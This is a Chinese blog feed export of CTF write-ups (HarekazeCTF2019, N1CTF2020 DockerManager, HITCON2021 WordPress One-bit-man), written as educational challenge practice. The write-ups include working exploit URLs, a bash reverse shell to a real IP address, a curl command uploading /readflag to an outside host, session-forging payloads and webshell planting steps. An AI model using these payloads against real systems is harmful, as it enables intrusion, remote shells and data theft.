<h2 id="小坑"><a href="#小坑" class="headerlink" title="小坑"></a>小坑</h2><p>一开始想直接执行&#x2F;readflag，试了半天没用，然后就用bash去执行，为了保险写了全路径&#x2F;bin&#x2F;bash，没想到还是不行，最后ls看了一下目录，发现斜杠&#x2F;全都在处理文件名的时候被作为目录丢掉了，&#x2F;readflag变成了readflag，自然就没法使用了，但是我就算是使用bash -c &#x2F;readflag这里也会有一个斜杠出现，为什么又可以成功呢？<br>还有就是使用bash执行命令行命令的时候要用-c，指定其在命令行下运行，否则会尝试用bash去执行那个二进制文件，不会有结果（bash理论上就可以执行一下.sh脚本）</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title>[HarekazeCTF2019]Easy Notes</title>
    <url>/%5BHarekazeCTF2019%5DEasy%20Notes.html</url>
    <content><![CDATA[<h1 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h1><p>PHP题，感觉好久没见了，buu上也不说明一下这个题给不给源码，导致我盲测了一个多小时受不了了看wp告诉我是有源码的，然后去GitHub翻源码做。。。害人</p>
<h2 id="卑微盲测"><a href="#卑微盲测" class="headerlink" title="卑微盲测"></a>卑微盲测</h2><p>随便登录一下，发现add，delete，view，export几个基本功能，flag功能获取flag但是要求我是admin，登录名改成admin显然无效，不知道是想让我怎么攻击，很令人在意的就是访问时是?page&#x3D;add这种形式，妥妥的文件包含，开始用filter读源码，被重定向回去，然后访问add.php，报404，那就估计是有一个次级目录专门放包含的文件，尝试跳目录包含自己，不行，简单的跳目录也不行，最后试了试page&#x3D;&#x2F;add都不行。放弃包含，估计是已经写死了所有能包含的内容了，后来看源码的确如此。</p>
<p>文件包含不行也有其他的攻击点，这个note添加进去之后会分配一个随机id，还能回显，这种东西可能会通过数据库维护文件系统，note的标题可能存在二次注入，打了一波过去，无果。。。然后查看note的时候get又会多提交一个参数id，也是一波注入，再打一轮，无果。。。心态爆炸</p>
<p>能感觉到比较题目最关键的那个export模块还没用过，但是测试一下就是把note内容作为json文件压缩一下发下来，不知道可利用的点在哪，随便打了一波奇奇怪怪的字符过去还全被用-给替代了<br>最重要的就是这一些和我是不是admin也没什么太大的关系。</p>
<p>开始找是不是有隐藏起来的源码，robots.txt www.zip,www.tar.gz,.git目录，全部无效，开始找wp</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>wp上来就告诉你给了源码，卑微去GitHub上翻源码继续做，哭了<br>在init.php里面有一句非常令人在意的话<code>session_save_path(TEMP_DIR);</code><br>刻意修改了session的存放位置，而看了一眼flag.php，对admin的判断就是看<code>isset($_SESSION[&#39;admin&#39;])</code>，是的话就是true了，这显然是要把session放到一个我们可控制的目录下，构造一个session获取flag<br>再去看令人在意的export功能，刚好也是用的这个TEMP_DIR<br>export.php</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">require_once</span><span class="token punctuation">(</span><span class="token string">'init.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_logged_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/?page=home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$notes</span> <span class="token operator">=</span> <span class="token function">get_notes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token string">'zip'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token variable">$type</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">get_user</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'-'</span> <span class="token punctuation">.</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">random_bytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$type</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'..'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// avoid path traversal</span>
<span class="token variable">$path</span> <span class="token operator">=</span> <span class="token constant">TEMP_DIR</span> <span class="token punctuation">.</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string">'tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$archive</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PharData</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token comment" spellcheck="true">// use zip as default</span>
  <span class="token variable">$archive</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZipArchive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">,</span> <span class="token constant">ZIPARCHIVE</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">CREATE</span> <span class="token operator">|</span> ZipArchive<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">OVERWRITE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$index</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$index</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$notes</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$index</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$note</span> <span class="token operator">=</span> <span class="token variable">$notes</span><span class="token punctuation">[</span><span class="token variable">$index</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token variable">$note</span><span class="token punctuation">[</span><span class="token string">'title'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/[^!-~]/'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token variable">$title</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token variable">$title</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'#[/\\?*.]#'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token variable">$title</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// delete suspicious characters</span>
  <span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"{$index}_{$title}.json"</span><span class="token punctuation">,</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$note</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$type</span> <span class="token operator">===</span> <span class="token string">'tar'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
  <span class="token variable">$archive</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Disposition: attachment; filename="'</span> <span class="token punctuation">.</span> <span class="token variable">$filename</span> <span class="token punctuation">.</span> <span class="token string">'";'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Length: '</span> <span class="token punctuation">.</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Content-Type: application/zip'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>在这个session存放的文件夹下创建一个文件，压缩写的note进去，然后下载下来，文件名的组成是<code>登录用户名-随机十六进制字符串.后缀</code>，session文件的格式刚好是sess_[a-zA-Z0-9-_]*，一开始我看见那个短斜杠的时候还以为没得机会了，结果也能用<br>session文件是不能包含点的，但是刚好他为了防止目录穿越，将..替换为空，而type提交的类型可以是任意值，值不是tar的时候用zip压缩罢了，因此提交type&#x3D;. ，就可以构造出一个很完美的session文件，而且我们还能得到这个session文件的名字，用他作为cookie登录</p>
<p>不过还是有一定的难度，毕竟使用的是压缩算法，压缩进去的东西乱七八糟的，但是进过尝试，note的标题会完整的在文件内容中出现，但需要保证session反序列化的时候不出问题，还需要构造一下</p>
<p>session的默认序列化引擎是php，序列化方法是 <code>键|序列化数据;</code>使用构造一个内容为<code>|N;admin|b:1;</code>的数据，<code>|N;</code>将前面的杂乱的数据作为一个键解决掉，防止序列化出错，然后给admin这个值赋个值就行了，提交该标题的note，在export.php提交type&#x3D;.，得到的文件名就是sessionID，改掉访问page&#x3D;flag获取flag</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>session反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>HarekazeCTF2019 encode_and_encode</title>
    <url>/%5BHarekazeCTF2019%5Dencode_and_encode.html</url>
    <content><![CDATA[<h1 id="HarekazeCTF2019-encode-and-encode"><a href="#HarekazeCTF2019-encode-and-encode" class="headerlink" title="[HarekazeCTF2019]encode_and_encode"></a>[HarekazeCTF2019]encode_and_encode</h1><p>感觉是一个外国比赛的签到题，思路很清楚就是不知道怎么实现<br>题目给了源码</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token variable">$banword</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token comment" spellcheck="true">// no path traversal</span>
    <span class="token string">'\.\.'</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true">// no stream wrapper</span>
    <span class="token string">'(php|file|glob|data|tp|zip|zlib|phar):'</span><span class="token punctuation">,</span>
    <span class="token comment" spellcheck="true">// no data exfiltration</span>
    <span class="token string">'flag'</span>
  <span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$regexp</span> <span class="token operator">=</span> <span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$banword</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'/i'</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$regexp</span><span class="token punctuation">,</span> <span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token variable">$body</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span>'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//input');</span>
<span class="token variable">$json</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$body</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
<span class="token punctuation">{</span>
  <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$json</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$content</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
  <span class="token punctuation">{</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">"&lt;p>not found&lt;/p>\n"</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span> 
<span class="token keyword">else</span> 
<span class="token punctuation">{</span>
  <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string">'&lt;p>invalid request&lt;/p>'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment" spellcheck="true">// no data exfiltration!!!</span>
<span class="token variable">$content</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">'/HarekazeCTF\{.+\}/i'</span><span class="token punctuation">,</span> <span class="token string">'HarekazeCTF{&amp;lt;censored&amp;gt;}'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'content'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$content</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>获取我们的输入用json方式解码，解码前需要将输入内容进行一个过滤，然后再把file_get_contents的内容在进行一次过滤，两次均通过判断即可输出，输出之前再把flag给你替换掉</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>思路很简单，file_get_contents支持php:&#x2F;&#x2F;filter，只要用这个伪协议读取文件，将其base64编码即可绕过对内容的过滤和替换，但是问题在于输入也需要一层过滤，且不能出现php字样<br>这里则是利用json解码时支持Unicode编码的，用Unicode替换掉一两个关键字就可以了<br>p&#x3D;\u0070 f&#x3D;\u0066</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>[N1CTF2020]DockerManager</title>
    <url>/%5BN1CTF2020%5DDockerManager.html</url>
    <content><![CDATA[<h1 id="N1CTF2020-DockerManager"><a href="#N1CTF2020-DockerManager" class="headerlink" title="[N1CTF2020]DockerManager"></a>[N1CTF2020]DockerManager</h1><p>一万年没刷buu的题，今天看到群里赵总丢了这个题的wp，粗略看了下感觉有点意思，就立即进行一个buu的复现。。。。</p>
<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>题目给了附件，包括Dockerfile，里面有一句<code>chmod 777 /var/www/html/img/</code><br>img目录可写<br>看源码，index.php锤子用没有，view.php写了一个curl的exec<br>接受了一大堆参数，host在拼了一堆乱七八糟的东西之后过了一个escapeshellarg()，</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$host_addr</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token variable">$mode</span> <span class="token punctuation">.</span> <span class="token string">'?all=true'</span><span class="token punctuation">;</span>
<span class="token variable">$host_addr</span> <span class="token operator">=</span> <span class="token function">escapeshellarg</span><span class="token punctuation">(</span><span class="token variable">$host_addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre>
<p>剩下几个参数也就是过了一个escapeshellarg()，就如果有值前面就会再加上–cert这样的选项<br>然后最后拼出来一句<code>$cmd = &#39;curl --connect-timeout 10 &#39; . $host_addr . &#39; -g &#39; . $cert . $key . $cacert;</code>放到exec里面去执行</p>
<p>复习一下escapeshellarg()，就是转义所以引号，再给最外层套一个引号，专门用来处理参数防止逃逸的。-g这个选项不知道有什么锤子用，反正不影响跑</p>
<p>分析一下我们的处境，可控制的变量全都过了一次escapeshellarg()，也就是说参数逃逸让exec执行其他命令已经不太行了<br>只能让curl自己来做些什么<br>这里的$cert，$key，$cacert的选项还被写死了，唯一可控的就是$host_addr，但$host_addr后面也被拼了一些垃圾</p>
<p>所以fuzz可以发现拼接的垃圾可以被00截断搞掉</p>
<h3 id="00截断"><a href="#00截断" class="headerlink" title="00截断"></a>00截断</h3><p>这里有一个小坑，我的理解和实际情况不是很一致，我一开始以为这个00截断一波，就直接把$cmd后面的内容都截断掉了，然后$host_addr就前面有半边escapeshellarg()加的引号而后面没闭合，我还在想是不是可以直接分号多执行一条语句，试了半天没成<br>本地开始测试，结果00截断直接报fatal error崩掉，人都傻了，最后怒而看请求头看PHP版本，发现用的是远古5.4，本地切换5.4就成了，并且00截断就只会出现一个warning<br>而<code>http://127.0.0.1/;whoami%00/pppppp</code>的过escapeshellarg()后的结果是<code>&quot;http://127.0.0.1/;whoami&quot;</code><br>也就是说只是在escapeshellarg()时截断掉了后面的内容，连加上来的引号都还留着，不过好歹$host_addr这个在引号里面的参数完全可控了</p>
<h3 id="短选项"><a href="#短选项" class="headerlink" title="短选项"></a>短选项</h3><p>就是-?这种就一个字母的选项，这种选项被引号包裹起来也能正常使用，使得我们可以在$host_addr内填的不是一个url，而是另一个短选项，然后看看有什么可以利用的短选项</p>
<p>寻找到-K，功能是读取一个文件作为curl的输入参数，看man手册<br>里面还举了一个很有意思的例子，这个配置文件里的url就是目标，而output则是将把从目标读来的内容写进对应文件，可以说是一个超级写shell功能了</p>
<pre><code># --- Example file ---
# this is a comment
url = &quot;example.com&quot;
output = &quot;curlhere.html&quot;
user-agent = &quot;superagent/1.0&quot;
# --- End of example file ---
</code></pre>
<p>不过这里还是有一个问题的，虽然-K读取的配置文件能忽略掉不符合语法的行，但是它只允许读取本地文件，并不能导入远端的，不然就一键打通了<br>那么就还得想办法在服务器上整一个文件出来</p>
<h3 id="x2F-proc-x2F-pid-x2F-cmdline"><a href="#x2F-proc-x2F-pid-x2F-cmdline" class="headerlink" title="&#x2F;proc&#x2F;`pid`&#x2F;cmdline"></a>&#x2F;proc&#x2F;`pid`&#x2F;cmdline</h3><p>虽然我知道有这么一回事，但是这个利用思路是真的牛逼，这也是我想复现这个题的原因<br>当使用exec的时候，会新开一个进程来执行exec的内容（操作系统常识），而cmdline里的内容就是这个进程启动时的命令行输入，这里的cmdline就是我们执行时的curl的那一长串$cmd<br>那么如果我们把这个cmdline给污染掉，污染成一个-K能理解的，从远端读取文件然后写到本地的配置文件格式，然后再起一个curl，指定-K去读取这个&#x2F;proc&#x2F;`pid`&#x2F;cmdline文件，就可以实现利用</p>
<p>但是pid是变动的，需要爆破，而我们curl发起到结束的时间太短，条件竞争都很难做到刚好命中<br>这里赵总又提出了一个很有意思的点，第一个curl的-K参数指定为<code>/dev/urandom</code>，这是Linux的随机数产生接口，会无止境的产生随机数，这样子指定curl去读，curl就会因为一直读不完这个”配置文件”而迟迟不能结束，这样子它在proc中就能常驻，也就可以再去触发了</p>
<p>构造第一次邪恶的访问<a href="http://1e0085be-28a0-4fd4-b7a6-4dd9596b2770.node3.buuoj.cn/view.php?host=-K/dev/urandom%00&amp;cert=1%0A%0Aurl=%E2%80%9Dhttps://www.z3ratu1.cn/shell.html%E2%80%9D%0Aoutput=%E2%80%9Dimg/shell.php%E2%80%9D%0A%0A">http://1e0085be-28a0-4fd4-b7a6-4dd9596b2770.node3.buuoj.cn/view.php?host=-K/dev/urandom%00&amp;cert=1%0a%0aurl=”https://www.z3ratu1.cn/shell.html”%0aoutput=”img/shell.php”%0a%0a</a></p>
<p>再指定host为<code>-K/proc/pid/cmdline</code>爆破就可以了<br>这里有一个奇怪的点，docker因为进程少，pid一般都很小，读个十来个就能差不多没了，但是我第一次测试的时候遍历了1-100没结果，反复了几次都不行，后来重启环境一遍就打通了，不知道是不是之前测的太多导致pid增长，最后我这次邪恶访问的pid超过100了？</p>
<h3 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h3><p>看根目录，有flag是500，readflag可执行，执行readflag返回了个这个回来<br><code>Solve the easy challenge first (((((-73792)-(-138348))-(129100))+(913156))+(131541)) input your answer: calculate error!</code><br>需要弹个shell回来交互一下，就system函数这么打不太行，后续输入没得<br>弹shell也智障了半天，bash -c这招我已经记住了，但是忘记url编码&amp;了。。。弹了半天没弹回来<br>记住url编码。。。。<br>system(“bash%20-c%20%27bash%20-i%20&gt;%26%20&#x2F;dev&#x2F;tcp&#x2F;47.103.140.44&#x2F;10020%200&gt;%261%27%20”);</p>
<p>弹了个shell也不好使，不给计算的机会就直接结束了，报了个错<br><code>bash: [131: 2 (255)] tcsetattr: Inappropriate ioctl for device</code><br><del>查了一下是由于这个程序的IO并没有重定向到我们弹出来的shell这</del><br>如上是来自Stack Overflow的错误解答。。。</p>
<h3 id="trap-“”-14"><a href="#trap-“”-14" class="headerlink" title="trap “” 14"></a>trap “” 14</h3><p>今天让AA手把手教了我一波，完全理解了是怎么回事，应该说这个东西在以前的ctf比赛中见到过<br>据说大家第一次遇到的时候解决方案是用Perl写交互脚本，很麻烦<br>不是重定向的问题，是readflag设置了一个定时器，在极短的时间内不能作答就直接退出了<br>先用curl把readflag拉下来确认一下<br><code>curl -F &quot;filename=@/readflag&quot; &quot;http://47.103.140.44:10055&quot;</code><br>然后丢进IDA逆向，能够很容易看到使用了一个ualarm函数，该函数作用为计时对应毫秒后发出一个SIGALRM信号，也就是timeout信号，默认收到timeout即超时退出，就会出现上述情形，不过参数设置的是1000，理论上计时是1s，但是实际用的时候感觉是一瞬间就退出去了（不知道什么情况）<br>后来看到evoA博客上说bash弹的不是交互shell，自己拿vps试了一下也是可交互的，问题应该还是出在这个ualarm上</p>
<p>使用trap指令进行对信号的控制，比如我们按下Ctrl-C会产生一个SIGINT(interrupt)，但是按下Ctrl-C不一定就得立即退出，可能还得扫尾做清理工作，所以使用trap指令指定收到对应信号的行为</p>
<p>因此，trap cmd sig，SIGALRM对应的数字是14，cmd留空代表忽略该信号<br>先键入<code>trap &quot;&quot; 14</code>让那个ualarm无效，然后就可以慢悠悠的计算算式获取flag了</p>
<p>总算全理清楚了</p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>反弹shell</tag>
        <tag>proc</tag>
      </tags>
  </entry>
  <entry>
    <title>[HITCON2021]web</title>
    <url>/%5BHITCON2021%5Dweb.html</url>
    <content><![CDATA[<h1 id="HITCON2021-web"><a href="#HITCON2021-web" class="headerlink" title="[HITCON2021]web"></a>[HITCON2021]web</h1><p>科恩究极联队katzebin出动，在坐了两天牢后顺利偷学神仙思路<br>web都是台湾神仙Orange出的题，有的题目有些迷之脑洞，有的题目又比较的有意思，但总而言之，我都不会嘻嘻</p>
<h2 id="One-bit-man"><a href="#One-bit-man" class="headerlink" title="One-bit-man"></a>One-bit-man</h2><p>可以修改WordPress中源码的一个bit来制造RCE<br>目前的想法就是可能有什么危险的配置项，直接把0变成1之类的，但是简单搜索了一下好像并没有搜到什么有用的数据</p>
<p>看wp完成，原来是直接修改登录处的判断，能使用任意密码登录WordPress，而WordPress以管理员身份登进去之后可以自由rce<br>是我完全不懂了呜呜，早知如此何必当初</p>
<p>登录判断在wordpress&#x2F;wp-includes&#x2F;user.php，WordPress好像是先通过用户名&#x2F;邮箱查有没有这个号，再判断password对不对，最后返回由用户名查询出的用户实例（这样子应该存在一个用户名遍历？），虽然看不太懂整体逻辑，但是还是能看出来密码校验应该是这个地方</p>
<pre class=" language-php"><code class="language-php">    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span> <span class="token function">wp_check_password</span><span class="token punctuation">(</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">user_pass</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">ID</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">WP_Error</span><span class="token punctuation">(</span>
            <span class="token string">'incorrect_password'</span><span class="token punctuation">,</span>
            <span class="token function">sprintf</span><span class="token punctuation">(</span>
                <span class="token comment" spellcheck="true">/* translators: %s: User name. */</span>
                <span class="token function">__</span><span class="token punctuation">(</span> <span class="token string">'&lt;strong>Error&lt;/strong>: The password you entered for the username %s is incorrect.'</span> <span class="token punctuation">)</span><span class="token punctuation">,</span>
                <span class="token string">'&lt;strong>'</span> <span class="token punctuation">.</span> <span class="token variable">$username</span> <span class="token punctuation">.</span> <span class="token string">'&lt;/strong>'</span>
            <span class="token punctuation">)</span> <span class="token punctuation">.</span>
            <span class="token string">' &lt;a href="'</span> <span class="token punctuation">.</span> <span class="token function">wp_lostpassword_url</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'">'</span> <span class="token punctuation">.</span>
            <span class="token function">__</span><span class="token punctuation">(</span> <span class="token string">'Lost your password?'</span> <span class="token punctuation">)</span> <span class="token punctuation">.</span>
            <span class="token string">'&lt;/a>'</span>
        <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>而<code>!</code>的ascii码刚好是0x21，和空格0x20相邻，直接翻转最低位把感叹号变成空格，这样子登录逻辑反而变成了密码错误即可登录</p>
<p>这个题最开始是尝试过去登陆后台的，WordPress的密码默认似乎是以某种他规定的md5格式存储的，也尝试去翻了下WordPress的默认用户名密码，发现并没有。。。是随机生成的，init.sql里面填的那个密码一眼就能看出来是个占位符。并且网上也搜不到什么后台rce就躺平了，还是我见识太少了呜呜</p>
<p>后台有经典修改主题功能，而修改主题功能有一项可以直接修改源代码，写一个shell就完事了。但似乎写个eval不能直接用？<br>一开始在index.php写了个eval，能简单的phpinfo和echo，但是system什么的就没反应了，phpinfo里也没有什么disable function之类的东西，改用一些看起来安全一点的函数比如scandir也没有反应。后来写到header.php里面，发现一输入就直接报错？<br>但是我不写eval，直接在页面里写入<code>system(&quot;/readflag&quot;);</code>就跑起来了。真奇怪啊？</p>
